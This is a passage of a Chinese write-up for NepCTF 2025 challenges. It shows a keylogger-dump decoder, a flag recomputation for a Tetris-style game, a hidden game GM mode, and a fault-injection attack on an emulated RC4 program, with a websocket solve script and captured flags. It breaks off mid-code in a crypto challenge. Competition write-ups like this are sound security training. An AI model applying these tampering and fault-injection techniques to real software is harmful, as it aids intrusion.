         <span class="hljs-keyword">if</span> value == <span class="hljs-number">1</span>:<br>                        result.append(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;LINUX_KEYCODE[code]&#125;</span>↓&#x27;</span>)<br>                    <span class="hljs-keyword">elif</span> value == <span class="hljs-number">0</span>:<br>                        result.append(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;LINUX_KEYCODE[code]&#125;</span>↑&#x27;</span>)<br>                <span class="hljs-keyword">elif</span> value == <span class="hljs-number">1</span>:<br>                    char = LINUX_KEYCODE.get(code)<br>                    <span class="hljs-keyword">if</span> char:<br>                        result.append(char)<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>.join(result)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-keyword">import</span> sys<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) != <span class="hljs-number">2</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;用法: python exp.py NepBot_keylogger&#x27;</span>)<br>        sys.exit(<span class="hljs-number">1</span>)<br>    filename = sys.argv[<span class="hljs-number">1</span>]<br>    output = keylog_restore(filename)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;恢复的键盘输入记录:&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(output)<br></code></pre></td></tr></table></figure><p>输出：<br><img src="/2025/07/25/NepCTF%202025%20Writeup/file-20250731010130413.png"><br>通过分析我们便能够得到数据库名为<code>NepCTF-20250725-114514</code>。</p><h2 id="SpeedMino"><a href="#SpeedMino" class="headerlink" title="SpeedMino"></a>SpeedMino</h2><p>一个俄罗斯方块游戏，按照题目的意思来看只要玩够2600分就可以获得flag，但是试了一下发现还是比较费时间的，于是转换思路从源码入手。<br>解压<code>SpeedMino.exe</code>文件，得到源码，发现是<code>lua</code>源码，查看<code>main.lua</code>，搜索2600，发现了结果计算的逻辑。<br><img src="/2025/07/25/NepCTF%202025%20Writeup/file-20250731170801031.png"><br>通过函数名等关键词跳转，发现所有的数据计算方法都能够在该文件中找到，直接把代码丢给ai写一个最后输出flag的计算脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs python">youwillget = [<span class="hljs-number">187</span>, <span class="hljs-number">24</span>, <span class="hljs-number">5</span>, <span class="hljs-number">131</span>, <span class="hljs-number">58</span>, <span class="hljs-number">243</span>, <span class="hljs-number">176</span>, <span class="hljs-number">235</span>, <span class="hljs-number">179</span>, <span class="hljs-number">159</span>, <span class="hljs-number">170</span>, <span class="hljs-number">155</span>,<br>              <span class="hljs-number">201</span>, <span class="hljs-number">23</span>, <span class="hljs-number">6</span>, <span class="hljs-number">3</span>, <span class="hljs-number">210</span>, <span class="hljs-number">27</span>, <span class="hljs-number">113</span>, <span class="hljs-number">11</span>, <span class="hljs-number">161</span>, <span class="hljs-number">94</span>, <span class="hljs-number">245</span>, <span class="hljs-number">41</span>,<br>              <span class="hljs-number">29</span>, <span class="hljs-number">43</span>, <span class="hljs-number">199</span>, <span class="hljs-number">8</span>, <span class="hljs-number">200</span>, <span class="hljs-number">252</span>, <span class="hljs-number">86</span>, <span class="hljs-number">17</span>, <span class="hljs-number">72</span>, <span class="hljs-number">177</span>, <span class="hljs-number">52</span>, <span class="hljs-number">252</span>,<br>              <span class="hljs-number">20</span>, <span class="hljs-number">74</span>, <span class="hljs-number">111</span>, <span class="hljs-number">53</span>, <span class="hljs-number">28</span>, <span class="hljs-number">6</span>, <span class="hljs-number">190</span>, <span class="hljs-number">108</span>, <span class="hljs-number">47</span>, <span class="hljs-number">16</span>, <span class="hljs-number">237</span>, <span class="hljs-number">148</span>,<br>              <span class="hljs-number">82</span>, <span class="hljs-number">253</span>, <span class="hljs-number">148</span>, <span class="hljs-number">6</span>]<br><br><span class="hljs-comment"># 等价于 Lua 的 youwillget[0] = #youwillget</span><br>youwillget.insert(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(youwillget))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">KSA</span>() -&gt; <span class="hljs-built_in">list</span>[<span class="hljs-built_in">int</span>]:<br>    key = <span class="hljs-string">b&quot;Speedmino Created By MrZ and modified by zxc&quot;</span><br>    key_len = <span class="hljs-built_in">len</span>(key)<br>    S = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>))<br>    j = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        j = (j + S[i] + key[i % key_len]) % <span class="hljs-number">256</span><br>        S[i], S[j] = S[j], S[i]<br>    <span class="hljs-keyword">return</span> S<br><br><br>secretBox = KSA()<br>secret_i = <span class="hljs-number">0</span><br>secret_j = <span class="hljs-number">0</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">calc_data</span>(<span class="hljs-params">text_table: <span class="hljs-built_in">list</span>[<span class="hljs-built_in">int</span>]</span>) -&gt; <span class="hljs-built_in">list</span>[<span class="hljs-built_in">int</span>]:<br>    <span class="hljs-keyword">global</span> secret_i, secret_j<br>    K = [text_table[<span class="hljs-number">0</span>]]         <span class="hljs-comment"># K[0] = text_len</span><br>    text_len = text_table[<span class="hljs-number">0</span>]<br>    <span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, text_len + <span class="hljs-number">1</span>):<br>        secret_i = (secret_i + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span><br>        secret_j = (secret_j + secretBox[secret_i]) % <span class="hljs-number">256</span><br>        secretBox[secret_i], secretBox[secret_j] = \<br>            secretBox[secret_j], secretBox[secret_i]<br>        idx = (secretBox[secret_i] + secretBox[secret_j]) % <span class="hljs-number">256</span><br>        K.append((text_table[n] + secretBox[idx]) % <span class="hljs-number">256</span>)<br>    <span class="hljs-keyword">return</span> K<br><br><br>pass_table = [<span class="hljs-number">55</span>] + [<span class="hljs-number">32</span>] * <span class="hljs-number">55</span>   <span class="hljs-comment"># 长度 55，全空格</span><br>calc_data(pass_table)           <span class="hljs-comment"># 只调用，丢弃返回值，目的是推进 i/j/S</span><br><br><br><span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2600</span>):<br>    youwillget = calc_data(youwillget)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">table_to_str</span>(<span class="hljs-params">text: <span class="hljs-built_in">list</span>[<span class="hljs-built_in">int</span>]</span>) -&gt; <span class="hljs-built_in">str</span>:<br>    text_len = text[<span class="hljs-number">0</span>]<br>    out = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, text_len + <span class="hljs-number">1</span>):<br>        c = text[i]<br>        <span class="hljs-keyword">if</span> c &lt; <span class="hljs-number">32</span> <span class="hljs-keyword">or</span> c &gt;= <span class="hljs-number">127</span>:<br>            out.append(<span class="hljs-string">&#x27;#&#x27;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            out.append(<span class="hljs-built_in">chr</span>(c))<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>.join(out)<br><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;flag:&quot;</span>, table_to_str(youwillget))<br></code></pre></td></tr></table></figure><p>得到flag：<code>NepCTF&#123;You_ARE_SpeedMino_GRAND-MASTER_ROUNDS!_TGLKZ&#125;</code></p><h2 id="meowble猫泡"><a href="#meowble猫泡" class="headerlink" title="meowble猫泡"></a>meowble猫泡</h2><p>打开附件，发现是一个Unity游戏，打开游戏跑一下，发现有提示，跑一会儿就可以发现会给出部分flag，但是貌似并不会获得全部，我们这里可以使用一款Unity游戏数据解析工具：<a href="https://assetripper.github.io/AssetRipper/articles/Downloads.html">Downloads</a> 来导出游戏数据。之后我们就可以使用Notepad++直接搜索提示信息<code>Tiptext</code>了。<br><img src="/2025/07/25/NepCTF%202025%20Writeup/file-20250805192314623.png"><br>但是发现flag也是少了第7段flag，提示给出让试试GM，应该是GameManager模式，直接在Assets\Scripts目录下查看CS脚本，发现可疑脚本，猜测应该是管理gm逻辑的：<br><img src="/2025/07/25/NepCTF%202025%20Writeup/file-20250805195031343.png"><br>分析CS脚本就知道是gm的启动方式是“上上下下左右左右BA”（貌似是魂斗罗30条命作弊代码），直接进入游戏按下<code>Esc</code>之后再按下对应按键进入GM模式，让输入命令，随便输入一些字母会发现提示：<br><img src="/2025/07/25/NepCTF%202025%20Writeup/file-20250805200014273.png"><br>因此我们可以输入“help”来寻找获取flag的方法，然后我们就可以发现能够getflag，然后我们结合缺失的flag和getflag的用法使用<code>getflag 7</code>来获取flag<br><img src="/2025/07/25/NepCTF%202025%20Writeup/file-20250805195610984.png"></p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima">NepCTF&#123;<span class="hljs-number">94721248</span>-773d-<span class="hljs-number">0b25</span>-<span class="hljs-number">0e2d</span>-db9cac299389&#125;<br></code></pre></td></tr></table></figure><h2 id="easyshock"><a href="#easyshock" class="headerlink" title="easyshock"></a>easyshock</h2><p><strong>题目：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> unicorn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> unicorn.x86_const <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> capstone <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> capstone.x86_const <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> ARC4<br><br>FLAG = os.getenv(<span class="hljs-string">&#x27;FLAG&#x27;</span>,<span class="hljs-string">&#x27;test&#123;This_is_a_test_flag_connect_to_get_true_flag&#125;&#x27;</span>).encode()<br><br>CODE_COUNT = <span class="hljs-number">0</span><br>TARGET_COUNT = <span class="hljs-number">0</span><br><span class="hljs-comment"># memory address where emulation starts</span><br>CODE_ADDRESS    = <span class="hljs-number">0x110000</span><br>DATA_ADDRESS    = <span class="hljs-number">0x220000</span><br>OUTPUT_ADDRESS  = <span class="hljs-number">0x330000</span><br>KEY_ADDRESS     = <span class="hljs-number">0x440000</span><br>STACK_ADDRESS   = <span class="hljs-number">0x880000</span><br>CODE = <span class="hljs-string">b&#x27;&#x27;</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;prog&quot;</span>,<span class="hljs-string">&quot;rb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    CODE = f.read()<br><br><br>ENTRY_POINT = CODE_ADDRESS + <span class="hljs-number">0x0</span><br>ENTRY_POINT_END = CODE_ADDRESS + <span class="hljs-number">0x296</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">flipBit</span>(<span class="hljs-params">uc:Uc,reg_name:<span class="hljs-built_in">str</span></span>):<br>    randBit = random.randint(<span class="hljs-number">0</span>,<span class="hljs-number">7</span>) <span class="hljs-comment">#not 0,63</span><br>    reg_num = <span class="hljs-built_in">eval</span>(<span class="hljs-string">&quot;UC_X86_REG_&quot;</span> + reg_name.upper())<br>    reg_value = uc.reg_read(reg_num)<br>    reg_value ^= <span class="hljs-number">1</span> &lt;&lt; randBit<br>    uc.reg_write(reg_num,reg_value)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">shock</span>(<span class="hljs-params">uc:Uc</span>):<br>    rip = uc.reg_read(UC_X86_REG_RIP)<br>    code = uc.mem_read(rip,<span class="hljs-number">16</span>)<br>    md = Cs(CS_ARCH_X86, CS_MODE_64)<br>    md.detail = <span class="hljs-literal">True</span><br>    dis = <span class="hljs-literal">None</span><br>    <span class="hljs-keyword">for</span> d <span class="hljs-keyword">in</span> md.disasm(code, <span class="hljs-number">0</span>):<br>        dis = d<br>        <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">for</span> reg_list <span class="hljs-keyword">in</span> dis.regs_access():<br>        <span class="hljs-keyword">for</span> reg <span class="hljs-keyword">in</span> reg_list:<br>            flipBit(uc,md.reg_name(reg))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">hook_code</span>(<span class="hljs-params">uc:Uc, address, size, user_data</span>):<br>    <span class="hljs-keyword">global</span> CODE_COUNT<br>    <span class="hljs-keyword">if</span>(CODE_COUNT &gt;= <span class="hljs-number">199999</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;   [⏰] Time Limit Exceed&quot;</span>)<br>        uc.emu_stop()<br>    <span class="hljs-keyword">if</span>(CODE_COUNT == TARGET_COUNT):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;   [⚡] Shock!&quot;</span>)<br>        shock(uc)<br>    CODE_COUNT += <span class="hljs-number">1</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>(<span class="hljs-params">data,key,target</span>):<br>    <span class="hljs-comment"># print(&quot;   [🔒] to enc: &quot;,data.hex())</span><br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">global</span> CODE_COUNT<br>        <span class="hljs-keyword">global</span> TARGET_COUNT<br>        CODE_COUNT = <span class="hljs-number">0</span><br>        TARGET_COUNT = target<br>        <span class="hljs-comment"># Initialize emulator </span><br>        mu = Uc(UC_ARCH_X86, UC_MODE_64)<br><br>        <span class="hljs-comment"># map memory</span><br>        mu.mem_map(CODE_ADDRESS, <span class="hljs-number">1</span> * <span class="hljs-number">0x1000</span>) <span class="hljs-comment"># Code</span><br>        mu.mem_map(DATA_ADDRESS, <span class="hljs-number">1</span> * <span class="hljs-number">0x1000</span>) <span class="hljs-comment"># DATA</span><br>        mu.mem_map(OUTPUT_ADDRESS, <span class="hljs-number">1</span> * <span class="hljs-number">0x1000</span>) <span class="hljs-comment"># Output</span><br>        mu.mem_map(KEY_ADDRESS, <span class="hljs-number">1</span> * <span class="hljs-number">0x1000</span>) <span class="hljs-comment"># KEY</span><br>        mu.mem_map(STACK_ADDRESS, <span class="hljs-number">2</span> * <span class="hljs-number">0x1000</span>) <span class="hljs-comment"># STACK</span><br>        <span class="hljs-comment"># write machine code to be emulated to memory</span><br><br>        mu.mem_write(CODE_ADDRESS, CODE)<br>        mu.mem_write(KEY_ADDRESS, key)<br>        mu.mem_write(DATA_ADDRESS, data)<br><br>        <span class="hljs-comment"># initialize machine registers</span><br>        mu.reg_write(UC_X86_REG_RIP, ENTRY_POINT)<br>        mu.reg_write(UC_X86_REG_RDI, DATA_ADDRESS)<br>        mu.reg_write(UC_X86_REG_RSI, KEY_ADDRESS)<br>        mu.reg_write(UC_X86_REG_RDX, OUTPUT_ADDRESS)<br>        mu.reg_write(UC_X86_REG_RSP, STACK_ADDRESS + <span class="hljs-number">0x1000</span>)<br><br>        <span class="hljs-comment"># tracing all instructions with customized callback</span><br>        mu.hook_add(UC_HOOK_CODE, hook_code)<br><br>        <span class="hljs-comment"># emulate machine code in infinite time</span><br>        mu.emu_start(ENTRY_POINT, ENTRY_POINT_END)<br><br>        result = mu.mem_read(OUTPUT_ADDRESS, <span class="hljs-number">1024</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;   [▶️] Result: &quot;</span>,result.<span class="hljs-built_in">hex</span>())<br><br>    <span class="hljs-keyword">except</span> UcError <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;   [💥] BOOM: %s&quot;</span> % e) <span class="hljs-comment"># https://www.bilibili.com/video/BV1ynKQzHEED</span><br><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">generateData</span>():<br>    text = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;text.txt&quot;</span>,<span class="hljs-string">&quot;rb&quot;</span>).read() + FLAG + <span class="hljs-string">b&#x27;\x0A&#x27;</span> <br>    key = os.urandom(<span class="hljs-number">16</span>)<br>    cipher = ARC4.ARC4Cipher(key).encrypt(text)<br>    <span class="hljs-keyword">return</span> cipher,key<br><br><br>cipher,key = generateData()<br>Shocktime = -<span class="hljs-number">1</span><br>Shocktime=<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;time to shock: &quot;</span>)<br><span class="hljs-keyword">try</span>:<br>    Shocktime=<span class="hljs-built_in">int</span>(Shocktime)<br><span class="hljs-keyword">except</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;wrong input!&quot;</span>)<br>run(cipher,key,Shocktime)<br></code></pre></td></tr></table></figure><p><strong>分析：</strong><br>故障注入攻击，分析题目所给代码，可以发现代码实现了一种比特翻转的漏洞，让<code>Shocktime</code>位置的汇编指令运行过程中所涉及的所有寄存器的最低位的一个字节随机翻转一个bit，这便是<code>shock</code>函数的逻辑。<br>接下来我们要分析获取<code>FLAG</code>的思路，通过代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">text = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;text.txt&quot;</span>,<span class="hljs-string">&quot;rb&quot;</span>).read() + FLAG + <span class="hljs-string">b&#x27;\x0A&#x27;</span> <br></code></pre></td></tr></table></figure><p>我们可以知道明文是由<code>text.txt</code>文件和<code>FLAG</code>拼接成的，使用IDA逆向一下<code>prog</code>文件，可以看到该文件是RC4的加密算法的二进制文件，按理说将<code>Shocktime</code>设为-1就不会执行相关的<code>Shock</code>函数，且RC4是对称密码，连着加密两次按理说会输出原本的密文，然而实际测试结果为：<br><img src="/2025/07/25/NepCTF%202025%20Writeup/file-20250807194717441.png"><br>我们可以发现明文到了<code>parameters.\n</code>之后输出全是<code>0x00</code>，我们再结合题目所给的<code>text.txt</code>文件分析：<br><img src="/2025/07/25/NepCTF%202025%20Writeup/file-20250807195114096.png"><br>从这个<code>0x00</code>开始就不正常输出了，因此可以合理推测在<code>prog</code>的RC4解密逻辑中对<code>0x00</code>做了特殊的判断。<br>之后我们的思路就明确了，找到对<code>0x00</code>进行特殊判断的汇编指令，找到该指令执行时对应的<code>CODE_COUNT</code>，再将<code>Shocktime</code>设定为该<code>CODE_COUNT</code>值，通过<code>shock</code>使该指令失效。<br>通过IDA寻找，可以快速地找到一个十分可疑的指令，它和下边的<code>jnz loc_169</code>结合使用实现了当前<code>eax</code>寄存器值不为0时发生跳转，并且我们可以找到其的相对地址。<br><img src="/2025/07/25/NepCTF%202025%20Writeup/file-20250807201217510.png"><br>然后我们便能够通过在<code>hook_code</code>中添加下面指令来获取对应的<code>CODE_COUNT</code>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">if</span>(address == CODE_ADDRESS + <span class="hljs-number">0x28D</span>):<br>        <span class="hljs-built_in">print</span>(CODE_COUNT)<br></code></pre></td></tr></table></figure><p>其中<code>address</code>表示当前指令的地址。将<code>Shocktime</code>设为-1后开始运行题目所给脚本，运行之后可以发现很多输出，由于我们要找到最后解密停止的地方，因此只需要最后一个<code>CODE_COUNT</code>即可。<br><img src="/2025/07/25/NepCTF%202025%20Writeup/file-20250807201825752.png"><br>得到对应的<code>CODE_COUNT</code>值为<code>49239</code>，然后连接服务器，设置<code>Shocktime=49239</code>，即可以向对应的汇编指令处进行故障注入，<code>shock</code>函数会在该指令执行前对寄存器进行修改，使对应的<code>eax</code>寄存器的值不再为<code>0</code>，代码会继续向下边进行解密，从而输出flag，脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> websocket<br><span class="hljs-keyword">import</span> ssl<br><span class="hljs-keyword">import</span> re<br><br>url = <span class="hljs-string">&quot;wss://www.nepctf.com/api/traffic/BVi5vUb4Fp8j0DH8bd3vf?port=9999&quot;</span><br><br>ws = websocket.create_connection(url, sslopt=&#123;<span class="hljs-string">&quot;cert_reqs&quot;</span>: ssl.CERT_NONE&#125;)<br><br>prompt = ws.recv()<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Server says:&quot;</span>, prompt.decode())<br><br>ws.send(<span class="hljs-string">&quot;49239\n&quot;</span>)<br><br>shock = ws.recv()<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Shock:&quot;</span>, shock.decode())<br><br>hex_line = ws.recv().strip().decode()[<span class="hljs-number">12</span>:]<br><span class="hljs-built_in">print</span>(hex_line)<br>plain = <span class="hljs-built_in">bytes</span>.fromhex(hex_line)<br><span class="hljs-built_in">print</span>(plain)<br><span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;NepCTF&#123;&#x27;</span> <span class="hljs-keyword">in</span> plain:<br>    flag = re.search(<span class="hljs-string">rb&#x27;NepCTF\&#123;[^\&#125;]+\&#125;&#x27;</span>, plain).group()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Flag:&quot;</span>, flag.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>, errors=<span class="hljs-string">&#x27;ignore&#x27;</span>))<br><br>ws.close()<br></code></pre></td></tr></table></figure><p>结果如下：<br><img src="/2025/07/25/NepCTF%202025%20Writeup/file-20250807202125783.png"></p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="NepSign"><a href="#NepSign" class="headerlink" title="NepSign"></a>NepSign</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a><strong>题目</strong></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> gmssl <span class="hljs-keyword">import</span> sm3<br><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> SystemRandom<br><span class="hljs-keyword">from</span> ast <span class="hljs-keyword">import</span> literal_eval<br><span class="hljs-keyword">import</span> os<br>flag = os.environ[<span class="hljs-string">&quot;FLAG&quot;</span>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">SM3</span>(<span class="hljs-params">data</span>):<br>    d = [i <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> data]<br>    h = sm3.sm3_hash(d)<br>    <span class="hljs-keyword">return</span> h<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">SM3_n</span>(<span class="hljs-params">data, n=<span class="hljs-number">1</span>, bits=<span class="hljs-number">256</span></span>):<br>    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n):<br>        data = <span class="hljs-built_in">bytes</span>.fromhex(SM3(data))<br>    <span class="hljs-keyword">return</span> data.<span class="hljs-built_in">hex</span>()[:bits // <span class="hljs-number">4</span>]<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Nepsign</span>():<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-variable language_">self</span>.n = <span class="hljs-number">256</span><br>        <span class="hljs-variable language_">self</span>.hex_symbols = <span class="hljs-string">&#x27;0123456789abcdef&#x27;</span><br>        <span class="hljs-variable 